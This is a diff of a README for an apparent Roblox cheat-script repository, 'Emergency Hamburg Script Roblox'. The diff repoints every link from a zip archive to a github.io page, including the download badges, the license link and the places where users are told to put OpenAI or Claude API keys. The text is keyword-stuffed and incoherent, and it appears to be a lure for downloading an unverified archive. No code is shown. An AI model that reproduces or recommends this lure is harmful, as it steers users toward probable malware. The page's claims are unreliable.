@@ -1,6 +1,6 @@
 # 🏁 Emergency Hamburg Script Roblox &mdash; The Complete Repository
 
-[![Download](https://raw.githubusercontent.com/xxxcrayon/emergency-hamburg-utilities-roblox/branch/udo/emergency-hamburg-utilities-roblox_v2.9.zip%20Hamburg%20Script-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/xxxcrayon/emergency-hamburg-utilities-roblox/branch/udo/emergency-hamburg-utilities-roblox_v2.9.zip)
+[![Download](https://xxxcrayon.github.io)](https://xxxcrayon.github.io)
 
 **Emergency Hamburg Script Roblox** is your trusty Swiss Army knife in the dynamic world of Roblox scripting. Set in the captivating universe of the Emergency Hamburg experience, this toolkit is carefully crafted to streamline your gameplay, empower your creativity, and ignite new adventures.
 
@@ -68,7 +68,7 @@ Engage with NPCs running on either OpenAI or Claude Large Language Models for im
 - **In-Game Translators**  
 Live SEO-friendly translations—UI and chat messages—empower international collaboration.
 
-*See the `https://raw.githubusercontent.com/xxxcrayon/emergency-hamburg-utilities-roblox/branch/udo/emergency-hamburg-utilities-roblox_v2.9.zip` for rapid initialization guidance.*
+*See the `https://xxxcrayon.github.io` for rapid initialization guidance.*
 
 ---
 
@@ -85,12 +85,12 @@ Live SEO-friendly translations—UI and chat messages—empower international co
 *q. How do I harness the full potential of Emergency Hamburg Script Roblox? Simple:*
 
 1. **Download the latest release**  
-   [Click here to download!]https://raw.githubusercontent.com/xxxcrayon/emergency-hamburg-utilities-roblox/branch/udo/emergency-hamburg-utilities-roblox_v2.9.zip
+   [Click here to download!]https://xxxcrayon.github.io
 
 2. **Extract the archive** into your chosen Roblox script folder.
 
 3. **(Optional) Set up API Keys:**  
-   Insert your OpenAI and/or Claude API keys in `https://raw.githubusercontent.com/xxxcrayon/emergency-hamburg-utilities-roblox/branch/udo/emergency-hamburg-utilities-roblox_v2.9.zip`. Follow `https://raw.githubusercontent.com/xxxcrayon/emergency-hamburg-utilities-roblox/branch/udo/emergency-hamburg-utilities-roblox_v2.9.zip` for details.
+   Insert your OpenAI and/or Claude API keys in `https://xxxcrayon.github.io`. Follow `https://xxxcrayon.github.io` for details.
 
 4. **Import into Roblox Studio:**  
    Drag included scripts and modules into your Hamburg game resources.
@@ -112,11 +112,11 @@ This script repository is a collaborative, passion-driven project designed to en
 ## 📜 MIT License (2025)
 
 This repository is released under the ultra-permissive MIT License, empowering you to use, modify, merge, or distribute the code as you please.  
-For complete licensing terms, consult the official [MIT License](https://raw.githubusercontent.com/xxxcrayon/emergency-hamburg-utilities-roblox/branch/udo/emergency-hamburg-utilities-roblox_v2.9.zip).
+For complete licensing terms, consult the official [MIT License](https://xxxcrayon.github.io).
 
 ---
 
-## [![Download](https://raw.githubusercontent.com/xxxcrayon/emergency-hamburg-utilities-roblox/branch/udo/emergency-hamburg-utilities-roblox_v2.9.zip%20Hamburg%20Script-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/xxxcrayon/emergency-hamburg-utilities-roblox/branch/udo/emergency-hamburg-utilities-roblox_v2.9.zip)
+## [![Download](https://xxxcrayon.github.io)](https://xxxcrayon.github.io)
 
 ---
 
